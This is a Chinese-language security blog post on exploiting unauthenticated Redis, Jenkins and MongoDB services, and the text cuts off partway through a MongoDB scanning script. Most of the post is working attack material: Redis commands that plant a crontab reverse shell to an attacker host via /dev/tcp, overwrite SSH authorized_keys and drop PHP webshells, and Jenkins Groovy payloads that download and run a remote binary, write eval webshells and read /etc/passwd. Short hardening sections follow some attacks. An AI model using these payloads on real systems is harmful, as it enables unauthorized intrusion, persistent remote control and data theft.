<!DOCTYPE html>












  


<html class="theme-next muse use-motion" lang="">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '6.6.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="参考文献：https://xz.aliyun.com/t/2320 自动扫描内网常见sql、no-sql数据库脚本(mysql、mssql、oracle、postgresql、redis、mongodb、memcached、elasticsearch)，包含未授权访问及常规弱口令检测：https://github.com/se55i0n/DBScanner Redis未授权访问123456789*">
<meta name="keywords" content="数据库及漏洞学习">
<meta property="og:type" content="article">
<meta property="og:title" content="未授权访问总结">
<meta property="og:url" content="https://cws6.github.io/2018/05/10/未授权访问总结/index.html">
<meta property="og:site_name" content="cws6">
<meta property="og:description" content="参考文献：https://xz.aliyun.com/t/2320 自动扫描内网常见sql、no-sql数据库脚本(mysql、mssql、oracle、postgresql、redis、mongodb、memcached、elasticsearch)，包含未授权访问及常规弱口令检测：https://github.com/se55i0n/DBScanner Redis未授权访问123456789*">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2018-12-03T13:30:25.929Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="未授权访问总结">
<meta name="twitter:description" content="参考文献：https://xz.aliyun.com/t/2320 自动扫描内网常见sql、no-sql数据库脚本(mysql、mssql、oracle、postgresql、redis、mongodb、memcached、elasticsearch)，包含未授权访问及常规弱口令检测：https://github.com/se55i0n/DBScanner Redis未授权访问123456789*">






  <link rel="canonical" href="https://cws6.github.io/2018/05/10/未授权访问总结/">



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>未授权访问总结 | cws6</title>
  











  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>
    <a href="https://github.com/cws6"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">cws6</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <p class="site-subtitle">空巢老人</p>
      
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>

      
      
    </ul>
  

  
    

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://cws6.github.io/2018/05/10/未授权访问总结/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cws6">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="cws6">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">未授权访问总结
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-05-10 19:55:13" itemprop="dateCreated datePublished" datetime="2018-05-10T19:55:13+08:00">2018-05-10</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-12-03 21:30:25" itemprop="dateModified" datetime="2018-12-03T21:30:25+08:00">2018-12-03</time>
              
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>参考文献：<a href="https://xz.aliyun.com/t/2320" target="_blank" rel="noopener">https://xz.aliyun.com/t/2320</a></p>
<p>自动扫描内网常见sql、no-sql数据库脚本(mysql、mssql、oracle、postgresql、redis、mongodb、memcached、elasticsearch)，包含未授权访问及常规弱口令检测：<br><a href="https://github.com/se55i0n/DBScanner" target="_blank" rel="noopener">https://github.com/se55i0n/DBScanner</a></p>
<h1 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* 查看信息：info</span><br><span class="line">* 删除所有数据库内容：flushall</span><br><span class="line">* 刷新数据库：flushdb</span><br><span class="line">* 看所有键：KEYS *，使用select num可以查看键值数据。</span><br><span class="line">* 设置变量：set test &quot;who am i&quot;</span><br><span class="line">* 设置路径等配置：config set dir dirpath </span><br><span class="line">* 获取路径及数据配置信息：config get dir/dbfilename </span><br><span class="line">* 保存：save</span><br><span class="line">* get 变量，查看变量名称</span><br></pre></td></tr></table></figure>
<p>匿名扫描脚本:<a href="https://xz.aliyun.com/t/528" target="_blank" rel="noopener">https://xz.aliyun.com/t/528</a></p>
<p><strong>①利用计划任务执行命令反弹shell</strong></p>
<p><em>在redis以root权限运行时可以写crontab来执行命令反弹shell</em><br>先在自己的服务器上监听一个端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 7999</span><br></pre></td></tr></table></figure></p>
<p>然后执行命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~## redis-cli -h xxx.xxx.x.xx</span><br><span class="line">     xxx.xxx.x.xx:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/xxx.xxx.x.xx/7999 0&gt;&amp;1\n&quot;</span><br><span class="line">     xxx.xxx.x.xx:6379&gt; config set dir /var/spool/cron/</span><br><span class="line">     xxx.xxx.x.xx:6379&gt; config set dbfilename root</span><br><span class="line">     xxx.xxx.x.xx:6379&gt; save</span><br></pre></td></tr></table></figure></p>
<p><strong>②写ssh-keygen公钥然后使用私钥登陆</strong><br>以前写过的文章<a href="https://www.jianshu.com/writer#/notebooks/10454425/notes/22403070" target="_blank" rel="noopener">https://www.jianshu.com/writer#/notebooks/10454425/notes/22403070</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">~/.ssh#ssh-keygen -t rsa</span><br><span class="line">#(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt</span><br><span class="line">#cat foo.txt | redis-cli -h x.x.x.x -x set crackit</span><br><span class="line">#redis-cli -h x.x.x.x</span><br><span class="line">     &gt; config set dir /root/.ssh/</span><br><span class="line">     &gt; config get dir</span><br><span class="line">     &gt; config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">     &gt; save</span><br><span class="line"></span><br><span class="line">ssh -i id_rsa root@x.x.x.x</span><br></pre></td></tr></table></figure></p>
<p>或<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xxx.xxx.x.xx:6379&gt; config set dir /root/.ssh/</span><br><span class="line">xxx.xxx.x.xx:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">xxx.xxx.x.xx:6379&gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&quot;</span><br><span class="line">xxx.xxx.x.xx:6379&gt; save</span><br></pre></td></tr></table></figure></p>
<p><strong>③往web物理路径写webshell</strong><br><em>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xxx.xxx.x.xx:6379&gt; config set dir /var/www/html/</span><br><span class="line">xxx.xxx.x.xx:6379&gt; config set dbfilename shell.php</span><br><span class="line">xxx.xxx.x.xx:6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">xxx.xxx.x.xx:6379&gt; save</span><br></pre></td></tr></table></figure></p>
<p><strong>④写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网）</strong></p>
<p>写二进制文件跟前边有所不同，原因在于使用RDB方式备份redis数据库是默认情况下会对文件进行压缩，上传的二进制文件也会被压缩，而且文件前后存在脏数据，因此需要将默认压缩关闭，并且通过计划任务调用python清洗脏数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#文件名a.lua</span><br><span class="line">local function hex2bin(hexstr)</span><br><span class="line">    local str = &quot;&quot;</span><br><span class="line">    for i = 1, string.len(hexstr) - 1, 2 do</span><br><span class="line">        local doublebytestr = string.sub(hexstr, i, i+1);</span><br><span class="line">        local n = tonumber(doublebytestr, 16);</span><br><span class="line">        if 0 == n then</span><br><span class="line">            str = str .. &apos;\00&apos;</span><br><span class="line">        else</span><br><span class="line">            str = str .. string.format(&quot;%c&quot;, n)</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">    return str</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">local dir = redis.call(&apos;config&apos;,&apos;get&apos;,&apos;dir&apos;)</span><br><span class="line">redis.call(&apos;config&apos;,&apos;set&apos;,&apos;dir&apos;,&apos;/tmp/&apos;)</span><br><span class="line">local dbfilename = redis.call(&apos;config&apos;,&apos;get&apos;,&apos;dbfilename&apos;)</span><br><span class="line">redis.call(&apos;config&apos;,&apos;set&apos;,&apos;dbfilename&apos;,&apos;t&apos;)</span><br><span class="line">local rdbcompress = redis.call(&apos;config&apos;,&apos;get&apos;,&apos;rdbcompression&apos;)</span><br><span class="line">redis.call(&apos;config&apos;,&apos;set&apos;,&apos;rdbcompression&apos;,&apos;no&apos;)</span><br><span class="line">redis.call(&apos;flushall&apos;)</span><br><span class="line"></span><br><span class="line">local data = &apos;1a2b3c4d5e6f1223344556677890aa&apos;//变量data保存的是程序的16进制编码</span><br><span class="line">redis.call(&apos;set&apos;,&apos;data&apos;,hex2bin(&apos;0a7c7c7c&apos;..data..&apos;7c7c7c0a&apos;))</span><br><span class="line">local rst = &#123;&#125;</span><br><span class="line">rst[1] = &apos;server default config&apos;</span><br><span class="line">rst[2] = &apos;dir:&apos;..dir[2]</span><br><span class="line">rst[3] = &apos;dbfilename:&apos;..dbfilename[2]</span><br><span class="line">rst[4] = &apos;rdbcompression:&apos;..rdbcompress[2]</span><br><span class="line">return rst</span><br></pre></td></tr></table></figure></p>
<p>执行<br><code>redis-cli --eval a.lua -h xxx.xxx.x.xx</code><br><em>redis不支持在lua中调用save,需要手动执行save操作,并删除key data，恢复dir等。</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis-cli save -h xxx.xxx.x.xx</span><br><span class="line">redis-cli config set dir *** -h xxx.xxx.x.xx</span><br><span class="line">redis-cli config set dbfilename *** -h xxx.xxx.x.xx</span><br><span class="line">redis-cli config set rdbcompression * -h xxx.xxx.x.xx</span><br></pre></td></tr></table></figure></p>
<p>目前写入的文件前后是存在垃圾数据的，下一步通过写计划任务调用python或者系统命令提取出二进制文件（写文件时在数据前后加入了<code>|||</code>作为提取最终文件的标识）。<br><code>*/1 * * * * python -c &#39;open(&quot;/tmp/rst&quot;,&quot;a+&quot;).write(open(&quot;/tmp/t&quot;).read().split(&quot;|||&quot;)[1])&#39;</code><br>/tmp/rst为最终上传的文件。</p>
<p><strong>⑤傻瓜式python脚本</strong><br><a href="https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py" target="_blank" rel="noopener">https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">执行命令</span><br><span class="line">需要root权限，每次添加计划任务前先获取服务器时间，然后根据获取的时间设置执行计划任务的时间，确保命令被执行一次，避免多次执行引发服务器异常。</span><br><span class="line">    python redis_exp.py --host xxx.xxx.x.xx -c &apos;id&apos;</span><br><span class="line"></span><br><span class="line">上传文件</span><br><span class="line">上传携带脏数据的文件不需要root权限，上传二进制文件需要root权限，先上传带有脏数据的文件，在文件前后插入特征字符串，然后添加计划任务截取数据</span><br><span class="line">    python redis_exp.py --host xxx.xxx.x.xx -l /data/payload.py -r /tmp/p.py</span><br><span class="line"></span><br><span class="line">暴力猜解目录</span><br><span class="line">不需要root权限，利用 config set dir &apos;xx&apos; 报错进行目录猜解</span><br><span class="line">    python redis_exp.py --host xxx.xxx.x.xx -f p.txt</span><br><span class="line"></span><br><span class="line">可以通过-p参数更改默认端口，-t参数更改等待时间</span><br></pre></td></tr></table></figure>
<p><strong>⑥批量验证</strong><br><a href="https://github.com/Ridter/hackredis" target="_blank" rel="noopener">https://github.com/Ridter/hackredis</a></p>
<p><strong>防护措施</strong><br>①禁止一些高危命令<br>修改 <code>redis.conf</code>文件，添加以下内容，来禁用远程修改 DB 文件地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG   &quot;&quot;</span><br><span class="line"> rename-command EVAL     &quot;&quot;</span><br></pre></td></tr></table></figure></p>
<p>②以低权限运行 Redis 服务<br>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆<br><code>$ groupadd -r redis &amp;&amp; useradd -r -g redis redis</code><br>③为 Redis 添加密码验证<br>修改 <code>redis.conf</code> 文件，添加<br><code>requirepass mypassword</code><br>④禁止外网访问 Redis<br>修改<code>redis.conf</code>文件，添加或修改，使得 Redis 服务只在当前主机可用<br><code>bind 127.0.0.1</code><br>⑤保证 authorized_keys 文件的安全<br>为了保证安全，阻止其他用户添加新的公钥。<br>将 <code>authorized_keys</code> 的权限设置为对拥有者只读，其他用户没有任何权限：<br><code>chmod 400 ~/.ssh/authorized_keys</code><br>为保证 <code>authorized_keys</code> 的权限不会被改掉，您还需要设置该文件的<code>immutable</code>位权限：<br><code>chattr +i ~/.ssh/authorized_keys</code></p>
<p>然而，用户还可以重命名 <code>~/.ssh</code>，然后新建新的<code>~/.ssh</code>目录和<code>authorized_keys</code>文件。要避免这种情况，需要设置<code>~./ssh 的 immutable</code> 位权限：<br><code>chattr +i ~/.ssh</code></p>
<p>Ps: 如果需要添加新的公钥，需要移除 <code>authorized_keys</code> 的 <code>immutable</code>位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 <code>immutable</code> 位权限。<br>6.修改默认端口</p>
<p>指定Redis监听端口，默认端口为6379<br><code>redis-server --port 6380</code><br>⑦防火墙<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// accept</span><br><span class="line"> iptables -A INPUT -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT</span><br><span class="line"> iptables -A INPUT -p udp -s 127.0.0.1 --dport 6379 -j ACCEPT</span><br><span class="line"></span><br><span class="line">// drop</span><br><span class="line"> iptables -I INPUT -p tcp --dport 6379 -j DROP</span><br><span class="line"> iptables -I INPUT -p udp --dport 6379 -j DROP</span><br><span class="line"></span><br><span class="line">// 保存规则并重启 iptables</span><br><span class="line">service iptables save</span><br><span class="line"> service iptables restart</span><br></pre></td></tr></table></figure></p>
<h1 id="Jenkins未授权访问"><a href="#Jenkins未授权访问" class="headerlink" title="Jenkins未授权访问"></a>Jenkins未授权访问</h1><p> <strong>①扫描探测</strong></p>
<p>弱口令扫描:<a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a> 或者<a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a><br>From: <a href="https://www.secpulse.com/archives/2166.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/2166.html</a><br>CVE-2017-1000353:<a href="https://blogs.securiteam.com/index.php/archives/3171" target="_blank" rel="noopener">https://blogs.securiteam.com/index.php/archives/3171</a><br>Ps: script/manage 是管理页面</p>
<p><strong>②攻击利用</strong></p>
<p><strong>2.1 反弹shell</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">println &quot;wget http://xxx.xxx.x.xx :8081/exp -P /tmp/&quot;.execute().text</span><br><span class="line">println &quot;chmod +x /tmp/exp&quot;.execute().text</span><br><span class="line">println &quot;/tmp/exp&quot;.execute().text</span><br></pre></td></tr></table></figure>
<p>或直接通过 Terminal+Plugin<br><a href="https://wiki.jenkins.io/display/JENKINS/Terminal+Plugin" target="_blank" rel="noopener">https://wiki.jenkins.io/display/JENKINS/Terminal+Plugin</a></p>
<p><strong>2.2 写webshell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1. println &quot;wget http://shell.com/shell.txt -P /var/www/html/&quot;.execute().text</span><br><span class="line"></span><br><span class="line">2. new File(&quot;/var/www/html/shell.php&quot;).write(&apos;&lt;?php @eval($_POST[shell]);?&gt;&apos;);</span><br><span class="line"></span><br><span class="line">3. </span><br><span class="line">def webshell = &apos;&lt;?php @eval($_POST[shell]);?&gt;&apos;</span><br><span class="line">new File(&quot;/var/www/html/shell.php&quot;).write(&quot;$webshell&quot;);</span><br><span class="line"></span><br><span class="line">4. </span><br><span class="line">def execute(cmd) &#123;</span><br><span class="line">def proc = cmd.execute()</span><br><span class="line">proc.waitFor()</span><br><span class="line">&#125;</span><br><span class="line">execute( [ &apos;bash&apos;, &apos;-c&apos;, &apos;echo -n &quot;&lt;?php @eval($&quot; &gt; /var/www/html/shell.php&apos; ] )</span><br><span class="line">execute( [ &apos;bash&apos;, &apos;-c&apos;, &apos;echo &quot;_POST[shell]);?&gt;&quot; &gt;&gt; /var/www/html/shell.php&apos; ] )</span><br><span class="line">//参数-n 不要在最后自动换行</span><br></pre></td></tr></table></figure></p>
<p><strong>2.3 读文件</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line"></span><br><span class="line">text = new File(&quot;/etc/passwd&quot;).getText();</span><br><span class="line"></span><br><span class="line">out.print text</span><br><span class="line"></span><br><span class="line">&#125; catch(Exception e)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>2.4 执行命令</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def sout = new StringBuilder(), serr = new StringBuilder()</span><br><span class="line">def proc = &apos;cat /etc/passwd&apos;.execute()</span><br><span class="line">proc.consumeProcessOutput(sout, serr)</span><br><span class="line">proc.waitForOrKill(1000)</span><br><span class="line">println &quot;out&gt; $sout err&gt; $serr&quot;</span><br></pre></td></tr></table></figure>
<p><strong>回显注意点</strong></p>
<ul>
<li>Result: 0 表示成功写入</li>
<li>Result: 1 表示目录不存在或者权限不足 写入失败</li>
<li>Result: 2 表示构造有异常 写入失败</li>
</ul>
<p>jenkins可以对每个用户分配不同的权限，如Overall/RunScripts或者Job/Configure权限，某些版本匿名用户可以访问asynchPeople 可爆破密码（通常很多密码跟用户名一样或者是其他弱口令(top1000)，尤其是内网）<br><strong>防护措施</strong></p>
<ul>
<li>在Jenkins管理页面添加访问密码。建议您使用由十位以上数字，字母和特殊符号组成的强密码。</li>
<li>不要将管理后台开放到互联网上。可以使用ECS安全组策略设置访问控制，默认策略为拒绝所有通信。可以根据业务发布情况仅开放</li>
<li>需要对外用户提供的服务，并控制好访问源IP</li>
</ul>
<h1 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h1><p>MongoDB 默认直接连接，无须身份验证，如果当前机器可以公网访问，且不注意Mongodb 端口（默认 27017）的开放状态，那么Mongodb就会产生安全风险，被利用此配置漏洞，入侵数据库。</p>
<ul>
<li>使用默认 mongod 命令启动 Mongodb</li>
<li>机器可以被公网访问</li>
<li>在公网上开放了 Mongodb 端口</li>
<li>数据库隐私泄露</li>
<li>数据库被清空</li>
<li>数据库运行缓慢</li>
</ul>
<p><strong>①扫描探测</strong></p>
<p>下载：<a href="http://nmap.org/svn/scripts/mongodb-info.nse" target="_blank" rel="noopener">http://nmap.org/svn/scripts/mongodb-info.nse</a><br><code>nmap -p 27017 --script mongodb-info &lt;ip&gt;</code><br><em>1.2 批量扫描未授权</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import pymongo</span><br><span class="line"></span><br><span class="line">ipcons = []</span><br><span class="line">def Scanner(ip):</span><br><span class="line">    global ipcons</span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sk.settimeout(0.3)</span><br><span class="line">    try:</span><br><span class="line">        sk.connect((ip,27017))</span><br><span class="line">        ipcons.append(ip)</span><br><span class="line">        sk.close()</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def ip2num(ip):</span><br><span class="line">    ip=[int(x) for x in ip.split(&apos;.&apos;)]</span><br><span class="line">    return ip[0] &lt;&lt;24 | ip[1]&lt;&lt;16 | ip[2]&lt;&lt;8 |ip[3]</span><br><span class="line"></span><br><span class="line">def num2ip(num):</span><br><span class="line">    return &apos;%s.%s.%s.%s&apos; %( (num &amp; 0xff000000) &gt;&gt;24,</span><br><span class="line">                                (num &amp; 0x00ff0000) &gt;&gt;16,</span><br><span class="line">                                (num &amp; 0x0000ff00) &gt;&gt;8,</span><br><span class="line">                                num &amp; 0x000000ff )</span><br><span class="line"></span><br><span class="line">def get_ip(ip):</span><br><span class="line">    start,end = [ip2num(x) for x in ip.split(&apos; &apos;) ]</span><br><span class="line">    return [ num2ip(num) for num in range(start,end+1) if num &amp; 0xff ]</span><br><span class="line"></span><br><span class="line">startIp = sys.argv[1]</span><br><span class="line">endIp = sys.argv[2]</span><br><span class="line">iplist = get_ip(sys.argv[1]+&quot; &quot;+sys.argv[2])</span><br><span class="line">for i in iplist:</span><br><span class="line">    Scanner(i)</span><br><span class="line"></span><br><span class="line">def connMon(ip_addr):</span><br><span class="line">    print &apos; Connect mongodb: &apos; + ip_addr + 